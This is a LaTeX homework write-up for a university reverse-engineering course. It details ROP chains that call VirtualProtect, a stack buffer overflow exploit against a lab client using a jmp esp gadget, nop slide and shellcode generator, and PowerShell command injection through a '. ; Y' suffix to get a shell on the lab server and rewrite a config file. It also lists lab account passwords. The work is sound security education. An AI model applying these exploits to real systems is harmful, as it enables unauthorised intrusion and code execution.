\documentclass{article}
% basics
\usepackage{amsfonts}
\usepackage{enumitem}
\usepackage{float}
\usepackage{graphicx}
\usepackage{hyperref} 
\usepackage[labelfont=bf]{caption}

\newtheorem{theorem}{Theorem}
\newtheorem{lemma}[theorem]{Lemma}
\newtheorem{corollary}{Corollary}[theorem]

% unique math expressions:  
\usepackage{amsmath}
\DeclareMathOperator*{\andloop}{\wedge}
\DeclareMathOperator*{\pr}{Pr}
\DeclareMathOperator*{\approach}{\longrightarrow}
\DeclareMathOperator*{\eq}{=}

% grey paper
\usepackage{xcolor}
% \pagecolor[rgb]{0.11,0.11,0.11}
% \color{white}

% embedded code sections
\usepackage{listings}
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\lstdefinestyle{mystyle}{
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}

\lstset{style=mystyle}

\begin{document}
\author{Yosef Goren \& Tomer Bitan}
\title{Reverse Engineering - Homework 4}
\maketitle
\tableofcontents

\part{Dry}
\section{}
Its possible to find this sequence even in a legitimate DLL as part of a longer sequence
for example in the assembly instruction \texttt{jmp 0xc364} the opcode will result in
\texttt{e960c30000} for which the automatic search can locate 60c3 in the middle of the
command.

\section{}
The first thing we need is to get the address of the location we wnat to jump to.
To do that we need to reach\texttt{[[0x70707070]+1B]}.
This can be done by setting \texttt{nop}'s all the way from the strcmy's buffer to the return
address then given we know the address in the stack where our return address is we
can mark it as X. draw the rest of the stack (with lower addresses at the bottom).

\begin{center}
    \begin{tabular}{|c|c|c|}
        \hline
        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
        \hline
        \hline
        13 & \texttt{0x9ad9e716} & // load [[0x70707070]+1B] to eax \\
        & & mov eax, DWORD PTR [eax+0Fh] \\
        & & ret \\
        \hline
        12 & \texttt{0x9ad9e711} & inc eax //thirds part of add up to 1B-F \\
        & & ret \\
        \hline
        11 & \texttt{0x9ad9e711} & inc eax //second part of add up to 1B-F \\
        & & ret \\
        \hline
        10 & \texttt{0x9ad9e709} & mov ecx, eax //first part of add up to 1B-F \\
        & & add ecx, 0Ah \\
        & & mov eax, ecx \\
        & & ret \\
        \hline
        9 & \texttt{0x9ad9e716} & mov eax, DWORD PTR [eax+0Fh] // load \\
        & & [0x70707070] to eax \\
        & & ret \\
        \hline
        8 & \texttt{0x15771690} & //junk \\
        \hline
        7 & \texttt{0x15771690} & //junk \\
        \hline
        6 & \texttt{0x15771690} & //junk \\
        \hline
        5 & \texttt{0x9ad9e700} & //place load address in eax and \\
        & & junk in others \\
        & & add eax, ebx\\ 
        & & pop ebx \\
        & & pop ecx \\
        & & pop ebx \\
        & & ret \\
        \hline
        4 & \texttt{0x9ad9e706} & //clear eax for jump \\
        & & xor eax,eax \\
        & & ret \\
        \hline
        3 & X+4 & //Current ebp location to make sure it doesnt \\
        & & change when poped \\
        \hline
        2 & \texttt{0x70707061} & //0x70707070-0x0F \\
        \hline
        1 & \texttt{0x9ad9e713} & //load addres for first derefrence \\
        & & pop ebx \\
        & & pop ebp \\
        & & ret \\
        \hline        
    \end{tabular}\\
\end{center}
Now that we have the address in eax we need to set up the parameters to call virtual
protect to change the permissions.
To do that will add on top of the previous stack to following:
\begin{center}
    \begin{tabular}{|c|c|c|}
        \hline
        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
        \hline
        \hline
        24 & \texttt{0x00201010} & //arg 3 for Virtual protect indicates empty place \\
        & & to copy previous permissions to \\
        \hline
        23 & \texttt{0x40000040} & //arg 2 for Virtual protect indicates permissions \\
        & & to chenge to \\
        \hline
        22 & \texttt{0x00001000} & //arg 1 for Virtual protect indicates size of block \\
        & & to change \\
        \hline
        21 & \texttt{0x9ad9e71c} & pushad //first push regs to bring eax to be arg0 \\
        & & of later call \\
        & & ret \\
        \hline
        20 & \texttt{0x9ad9e704} & //will later use to get to sep to ebp's content \\
        \hline
        19 & \texttt{0x9ad9e71a} & pop edi //place 0x9ad9e704 in edi \\
        & & ret \\
        \hline
        18 & Virtual Protect Adress & //store there so that second pushad will place it \\
        & & inplace \\
        \hline
        17 & \texttt{0x9ad9e71c} & //set up for second pushad \\
        \hline
        16 & \texttt{0x9ad9e703} & //set ebx to VirtualProtect address and ecx to \texttt{0x9ad9e71c} \\
        & & pop ecx \\
        & & pop ebx \\
        & & ret \\
        \hline
        15 & \texttt{0x9ad9e702} & //after push we will use this to fill ebx and bring \\
        & & esp to where ecx will be \\
        \hline
        14 & \texttt{0x9ad9e714} & pop ebp //place 0x9ad9e702 in ebp for later \\
        & & ret \\
        \hline        
    \end{tabular}\\
\end{center}
To see that this stack’s ROP execution will result in a call to virtual protect we cal look at
what the stack will change to once we reach execution of 21:
(esp points to the bottom of our stack when returning from the load and goes up by two ,
then by three then by two again. So we will reach the execution of 0x9ad9e71c (in 21)
after executing 14,16, and 19in the order placed on the stack):
\begin{center}
    \begin{tabular}{|c|c|c|}
        \hline
        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
        \hline
        \hline
        24 & \texttt{0x00201010} & //arg 3 for Virtual protect indicates empty place \\
        & & to copy previous permissions to \\
        \hline
        23 & \texttt{0x40000040} & //arg 2 for Virtual protect indicates permissions \\
        & & to chenge to \\
        \hline
        22 & \texttt{0x00001000} & //arg 1 for Virtual protect indicates size of block \\
        & & to change \\
        \hline
        21 & \texttt{[[0x70707070]+1B]} (eax) & //pushed by pushad \\
        \hline
        20 & \texttt{0x9ad9e71c} (ecx) & // second call to 'pushad' to place eax as return \\
        & & value for Virtual Protect \\
        & & pushad \\
        & & ret \\
        \hline
        19 & Junk (edx) & //unknown value left by pushad \\
        \hline
        18 & Virtual Protect Adress (ebx) & //set up for when the second call of pushad \\
        & & moves this to be before eax \\
        \hline
        17 & Esp before 'pushad' & //value left by pushad \\
        \hline
        16 & \texttt{0x9ad9e702} (ebp) & // used to load VPA to ecx and move esp up 16 \\
        & & bytes \\
        & & pop ebx \\
        & & pop ecx \\
        & & pop ebx \\
        & & ret \\
        \hline
        15 & Junk (esi) & //unknown value left by pushad \\
        \hline
        14 & \texttt{0x9ad9e704} (edi) & pop ebx //used to move esp up by 8 bytes \\
        & & ret \\
        \hline        
    \end{tabular}\\
\end{center}
After the first ‘pushad’ call we will again have our esp point to the bottom this section (in
the same place as before). We will again execute 14 then 16 then 20 and call
0x9ad9e71c. Then finally our stack will look like this: with esp pointing to 13.

\begin{center}
    \begin{tabular}{|c|c|c|}
        \hline
        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
        \hline
        \hline
        24 & \texttt{0x00201010} & //arg 3 for Virtual protect indicates empty place \\
        & & to copy previous permissions to \\
        \hline
        23 & \texttt{0x40000040} & //arg 2 for Virtual protect indicates permissions \\
        & & to chenge to \\
        \hline
        22 & \texttt{0x00001000} & //arg 1 for Virtual protect indicates size of block \\
        & & to change \\
        \hline
        21 & \texttt{[[0x70707070]+1B]} (eax) & //pushed by pushad \\
        \hline
        20 & \texttt{[0x70707070]+1B]} (eax) & //pushed by second pushad \\
        \hline
        19 & Virtual Protect Adress (ecx) & //ready to call Virtual protect with ret address \\
        & & eax and arguments 21-24 \\
        \hline
        18 & junk (edx) & //value left by pushad \\
        \hline
        17 & junk (edx) & //value left by pushad \\
        \hline
        16 & Esp before 'pushad' & //value left by pushad \\
        \hline
        15 & 0x9ad9e702 (ebp) & pop ebx // used to move esp up 16 bytes \\
        & & pop ecx \\
        & & pop ebx \\
        & & ret \\
        \hline
        14 & Junk (esi) & //unknown value left by pushad \\
        \hline
        13 & \texttt{0x9ad9e704} (edi) & pop ebx //used to move esp up by 8 bytes \\
        & & ret \\
        \hline        
    \end{tabular}
\end{center}
Now our jump to Virtual Protect is finally set up and we will have our esp points to 13 so
is will execute 13 then 15 then 19 and jump to Virtual Protect.
When returning from Virtual Protect we will automatically jump to our code in the new
page because its in the return address.

\section{}
Our ROP didint work because in order to specify the size of the window we must have 4
consecutive 0's however this will be interpreted but the Unicode strcpy as a NULL
terminator and the string will cut off missing the last part of the permissions. Notice this
wont be a problem with the the permission level argument because we chose to add the
\texttt{PAGE\_TARGETS\_NO\_UPDATE} option which wont damage our ability to run code but will
also not have a problem with parsing 0's since we will get \texttt{0x4000} and \texttt{0x0040}.

\section{}
o fix this problem with the new gadget we can replace the \texttt{0x00001000} argument with
its negative \texttt{0xffff000} and place the call to the new gadget as such:
\begin{center}
    \begin{tabular}{|c|c|c|}
        \hline
        & \textbf{Stack (lower=bottom)} & \textbf{Explanation} \\
        \hline
        \hline
        25 & \texttt{0x00201010} & //arg 3 for Virtual protect indicates empty place \\
        & & to copy previous permissions to \\
        \hline
        24 & \texttt{0x40000040} & //arg 2 for Virtual protect indicates permissions \\
        & & to chenge to \\
        \hline
        23 & \texttt{0xffff000} & //arg 1 for Virtual protect indicates size of block to change in negative \\
        & & to change \\
        \hline
        22 & \texttt{0x9ad9e71c} & pushad //first push regs to bring eax to be arg0 \\
        & & of later call \\
        & & ret \\
        \hline
        21 & \texttt{0x6ad6e71d} & //negte the argument back to its original form \\
        & & neg [esp + 04h] \\
        & & ret \\
        \hline
        20 & \texttt{0x9ad9e704} & //will later use to get to sep to ebp's content \\
        \hline
        19 & \texttt{0x9ad9e71a} & pop edi //place 0x9ad9e704 in edi \\
        & & ret \\
        \hline
        18 & Virtual Protect Adress & //store there so that second pushad will place it \\
        & & inplace \\
        \hline
        17 & \texttt{0x9ad9e71c} & //set up for second pushad \\
        \hline
        16 & \texttt{0x9ad9e703} & //set ebx to VirtualProtect address and ecx to \texttt{0x9ad9e71c} \\
        & & pop ecx \\
        & & pop ebx \\
        & & ret \\
        \hline
        15 & \texttt{0x9ad9e702} & //after push we will use this to fill ebx and bring \\
        & & esp to where ecx will be \\
        \hline
        14 & \texttt{0x9ad9e714} & pop ebp //place 0x9ad9e702 in ebp for later \\
        & & ret \\
        \hline        
    \end{tabular}\\
\end{center}

The execution with remain the same as before only this time once 21 is executed the
esp will be pointing at 22 and so esp+4 will point at the argument we want to switch
back. From that point once we return and call pushad everything will continue as before
and the ROP will work.

\part{Wet}
\setcounter{section}{0}
\section{}
Skipped\dots
\section{}
With each of the users we know of:
\begin{itemize}
    \item wizard | ME7WS9H9UXV9DND4
    \item goblin | 34U97VEYPNODNGZS
    \item giant | QVN4ZXKH38PGDGS2
    \item archer | FKGXJP0OCE1LKT3D
\end{itemize}
we have attempted to login using their credentials.\\
For all of the users we have got something like:
\begin{lstlisting}
> hw4_client.exe
Enter username: goblin
Enter password: 34U97VEYPNODNGZS
Welcome goblin

What would you like to do?
[1] ECHO - ping the server with a custom message, receive the same.
[2] TIME - Get local time from server point of view.
[3] 2020 - Get a a new year greeting.
[4] USER - Show details of registered users.
[5] DMSG - Download message from the server.
\end{lstlisting}
Accept for the archer were we got:
\begin{lstlisting}
> hw4_client.exe
Enter username: archer
Enter password: FKGXJP0OCE1LKT3D
Welcome archer (Admin)

What would you like to do?
[1] ECHO - ping the server with a custom message, receive the same.
[2] TIME - Get local time from server point of view.
[3] 2020 - Get a a new year greeting.
[4] USER - Show details of registered users.
[5] DMSG - Download message from the server.
[6] PEEK - peek into the system.
[7] LOAD - Load the content of the last peeked file.
\end{lstlisting}
Note that not only does the welcome message mention that this user is an admin
- but there are also additional options offered to him. This meant that this 
user must have elevated permissions.\\
The \texttt{users.py} script connects to 'archer' and prints the list of users.

\section{}
\subsection{Related Dry Questions}
\begin{itemize}
    \item \textbf{Socket Address:} We have detailed the process of finding the socket
    at \ref{shellcont}.
    \item  \textbf{Shellcode Stack:} Indeed our shellcode allocates
    it's own local variables and makes call to procedures from the
    original executable, and thus requires it's own stack. As detailed
    at \ref{shellcont} - to solve this issue we have expanded the stack
    to bellow our shellcode, and from that point we use that stack
    normally as if that expansion was the initial stack frame.
    \item \textbf{Finding \texttt{jmp esp}:} As described in the question,
    the instructions of the dll are always loaded to the same addresses,
    and hence if we run the described sample as it's own program - 
    whatever address we find in the local memory of that process - 
    will be identical to the addresses of those instructions
    in the dll module which have been loaded to our target program.\\
    The sample code first finds the module which we are interested in,
    then inside it - it find the specific address of the code we are interested in.
\end{itemize}

\subsection{Initial Static Analysis}
We have started this part by analyzing (statically - ida) our target file \texttt{hw4\_client.exe}.\\
At the start we try to get a general overview of the program:
After the input credentials are given to the program,
it requests us for a 4 letter command so
we have found the procedure which finds this request.\\
It appears to return a command code which is a number (enum essentially)
which represents which command was given. We note that the
PEEK command which we are interested in has command code 7.\\
After the command is selected - we are also requested
to input a 'file name' which is meant to be sent to the server.\\
In the static analysis the volunerability is clear:\\
The \texttt{scanf} call which reads this 'file name'
has a write pointer onto the stack and while the output buffer
has a constant size of about 16 KB; the scanf output
is not bound in any way.\\
The place where we are meant to insert this string will be our opening to take
over the program.\\

At the end of the injection process - we want
the execution to jump to shellcode which we will write using the same buffer.\\
The simplest solution would be to simply override the return address
with the address at which the start of our shellcode will be located.\\
The reason we have ended up using a slightly more compilcated solution then
this was that our shellcode will be found on the stack - meaning that
it's address might not be constant between different executions of the program.\\

Considering this, our general plan is as follows:
\begin{enumerate}
    \item Find the exact offset between the buffer start and the return address.
    \item Find a gadget containing a \texttt{jmp esp} instruction.
    \item Place the gadget at that offset.
    \item Place a relative jump command \texttt{jmp -300} right after where the return address was.
    \item Place a \texttt{nop} slide between the buffer start and up to this point.
    \item Place our shellcode somewhere in between where that relative jump will land and
        where the return address should be.
\end{enumerate}
After these steps are done properly 
the program execution should be as follows:
\begin{center}
    \begin{tabular}{|c|c|}
        \hline
        \textbf{Address} & \textbf{Instruction}\\
        \hline
        \texttt{.text <vulnerable\_proc>} & \texttt{call scanf}\\
        & \dots\\
        & \texttt{ret}\\
        \hline
        \texttt{.text <gadjet>}: & \texttt{jmp esp}\\
        \hline
        \texttt{.stack}: & \texttt{jmp -300}\\
        & \texttt{nop}\\
        & \dots\\
        & \texttt{nop}\\
        & \texttt{<shellcode start>}\\
        \hline
    \end{tabular}
\end{center}
Step 1: To find the exact offset we simply had to run the program once and
stop it at the \texttt{ret} instruction we have found the required offset to be 16304.\\
Step 2: To find the gadget - we have used an assembler to find the exact hexadecimal representation
of this instruction and have serached for a match for it in the program's code section.
We have found it at address: \texttt{0x62502028}.\\

\subsection{Shellcode Injection Framework}
For the rest of the steps we decided it will be helpful to create a
python tool for generating the binary content which will be passed to the program.\\
The tool can be found at the file \texttt{shellcode.py}.\\

Inside we have define a class \texttt{ShellCodeGenerator} which has a few
helpful methods for creating overflowing binary content.\\
Genrally - the usage of the class is as follows: an instance is created,
and the methods are used to describe the desigered binary content -
then the \texttt{write\_to\_file} method is used to write 
the generated binary content to a file.\\

The most notable methods for the binary generation process are:
\begin{itemize}
    \item \texttt{append\_strline} - use to add the username, password and command at the start of the resulting input file.
    In practice this simply appends the ascii encodings to the provided string to the binary stream.
    \item \texttt{load\_from\_asm\_file} - this method assembles the content of the provided
    assembly file, then appends the resulting binary content to the binary stream.
    \item \texttt{append\_dword} - this method recives a 32-bit number - such as an address
    and appends it to the bitstream - in little endian format.
    \item \texttt{start\_buffer\_cnt} - this starts keeping track of the current offset
    the binary stream (initialized to 0).
    \item \texttt{comptete\_buffer\_to\_size} This completes the current 
    buffer to the provided size by appending \texttt{nop} instructions.
    In conjunction with \texttt{start\_buffer\_cnt} we can esaly ensure
    we will override the return address at the correct offset without worrying about
    what was the exact size of what we have inserted into the buffer so far.
\end{itemize}

After implementing this class, to create our binary input file we simply run:
\begin{lstlisting}
gen = ShellCodeGenerator()
gen.append_strline("archer")
gen.append_strline("FKGXJP0OCE1LKT3D")
gen.append_strline("PEEK")

gen.start_buffer_cnt()
gen.nop_cascade(16004)
gen.load_from_asm_file(asm_input_filename)
gen.comptete_buffer_to_size(16304)#
gen.append_dword(0x62502028)
gen.append_asmline("jmp -330")
gen.append_strline("")

gen.write_to_file(output_filename)
\end{lstlisting}

After we have done all of this correctly - we can simply write
the assembly for our shellcode in a file and run the script.\\

\label{shellcont}
\subsection{Shellcode Content}
Our shellcode content can be found
in assembly format at the file \texttt{shellcode.S}.\\
The final binary content passed as input to the program is at the file \texttt{shellcode.bin}.\\

The idea of our shellcode is simple: Find how the program
normally sends requests to the server and attempt to replicate the same process
- then jump back to the start of our shellcode - and by doing so -
repeat the process in an infinite loop.\\

The first part of doing so was an additional session of static analysis
centered around finding where the program actually sends the requests to the server.\\
A good first step for this was to search for invokations of the \texttt{send} and \texttt{recv}
library function.\\
We have found both in a function we have called \texttt{send\_recv}.\\
From this function we can trace back where the socket object
is given from to the library functions.\\
Going back from \texttt{send\_recv}
we encounter a function we have called \texttt{handle\_request};
upon further inspection - it's API appears to be something like:
\begin{lstlisting}
handle_req(sock_ptr,cmd_num,req_content_buf,srv_out_buf,silent)
\end{lstlisting}
This seemed to us like a good place to start.
We already know we want \texttt{cmd\_num=7}, \texttt{silent=0} -
so we are left to deal with the rest of the arguments:
\begin{itemize}
    \item \texttt{sock\_ptr}: We have traced this parameter back to the \texttt{main} function
    where it is initialized to the return value of the \texttt{connect} function.\\
    So now we know how to get it ourselves in our shellcode.
    \item \texttt{srv\_out\_buf}: For this and the following parameter we
    notice that we will need to allocate a large buffer - so we decide to
    first expand the stack enough to where the ESP was before the overflow -
    to avoid overriding our own shellcode - the we allocate enough space for
    both of these buffers on the new stack area. \texttt{srv\_out\_buf} requires no initialization from us.
    \item \texttt{req\_content\_buf}: Since the value inside this buffer will be the request
    itself - we want to get the content for it from the user - so we make an invokation to \texttt{scanf}.
    To avoid using our own format string - we use the same format string that created the original
    overflow
    \footnote{somewhat ironically meaning the exact same overflow volunerability is still present in our shellcode}.
\end{itemize}

After we implement all of these parts, all that is left to do is to invoke
\texttt{handle\_request} then jump back to the start of our shellcode.\\

\subsection{From Input File to Interactive Loop}
After succesfully implementing the prior section,
we can append any list of inputs to the injection file and it will
send each request line which is after the buffer overflow content
as a request to the server and handle it.\\

Since we want this process to be interactive - we create 
a python script which enables us run as subprocess
with an input file - followed by an interactive session 
as soon as the file ends.\\
The implementation for this script can be found at \texttt{run\_on\_input.py}.\\

In conjunction with \texttt{shellcode.bin} created by our shellcode generation script
we have an interactive loop for making \texttt{PEEK} requests to the server.

\section{}
The next step was to use our interactive \texttt{PEEK} request
shell to achive remote code execution on the server.\\
After playing with the shell for a few second we notice the following error message:\\
\begin{lstlisting}
PS C:\Users\pc\Desktop\Semesters\S8\Reverse-Engineering-236496\Homework4\Wet> python .\run_on_input.py
Enter username: Enter password: Welcome archer (Admin)

What would you like to do?
[1] ECHO - ping the server with a custom message, receive the same.
[2] TIME - Get local time from server point of view.
[3] 2020 - Get a a new year greeting.
[4] USER - Show details of registered users.
[5] DMSG - Download message from the server.
[6] PEEK - peek into the system.
[7] LOAD - Load the content of the last peeked file.
your choice (4 letters command code): aaa
Get-ChildItem : Cannot find path 'C:\Users\idanRaz\RE_HW\generated\server\322218611-211515606\aaa' because it does not
exist.
At line:1 char:1
+ Get-ChildItem -Name -Path aaa
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\idanRa...1-211515606\aaa:String) [Get-ChildItem], ItemNotFound
   Exception
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
\end{lstlisting}
From this error message we learn two things:
Firstly - we are interacting with PowerShell. Secondly
- this shell attempts to run whatever \texttt{X} is given
to it as a command \texttt{Get-ChildItem -Name -Path X}.\\
Thus we can actually ignore the prefix of the command and just run a different one
by appending it to the end of the command,
so if we want to run \texttt{Y} we will actually pass on '\texttt{. ; Y}'
and so the final input seen by powershell will be '\texttt{Get-ChildItem -Name -Path . ; Y}'
which means \texttt{Y} should be run seperately.\\
Since we wanted to avoid seeing the output of the first part of the command - we have also
redirected it's output to \texttt{null}: '\texttt{. > \$null ; Y}'.\\

So for example to run \texttt{ls}:
\begin{lstlisting}
...
your choice (4 letters command code): . > $null ; ls

    Directory: .

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/19/2023  10:10 AM                config
d-----        6/19/2023  10:10 AM                database
d-----       10/29/2020   9:57 AM                files
d-----         6/9/2021   1:34 PM                source
d-----        6/19/2023  10:10 AM                tools
d-----        6/19/2023   3:52 PM                __pycache__
-a----       12/24/2020   9:54 PM          24064 Capture.dll
...
\end{lstlisting}

In order to get this functionality in an interactive format,
we have created a new python script to wrap the \texttt{run\_on\_input.py} script:
we have called it \texttt{attack\_shell.py}; it simply
runs \texttt{run\_on\_input.py} as a subprocess 
and gives it the input from the end user prefixed with '\texttt{. > \$null ; }'.\\
Additionally - if it sees \texttt{exit} it terminates, and
if it sees \texttt{restart} - it closes the subprocess and starts over again.\\

Now we have a full on shell to interact with the server.

\section{Putting Down the Flames}
After some exploring the server for a few minutes we find a suspiciously named
file: \texttt{config/attack.config}.\\
It's initial content was something like:
\begin{lstlisting}    
Fires: True
Rivals: True
Knights Infected: True
Robber Hunted: False
\end{lstlisting}

So we wanted to change the content to the files so that flames will be off,
hence we run:
\begin{lstlisting}
echo 'Fires: False' > config/attack.config
echo 'Rivals: True' >> config/attack.config
echo 'Knights Infected: False' >> config/attack.config
echo 'Robber Hunted: False' >> config/attack.config
cat config/attack.config
\end{lstlisting}
After doing this we see the file has the wanted content.\\

Our \texttt{attack\_knights.py} file simply uses the server from the last part,
and gives it the 5 shell commands from above.

Horray! The flames in the site are off!\\

\end{document}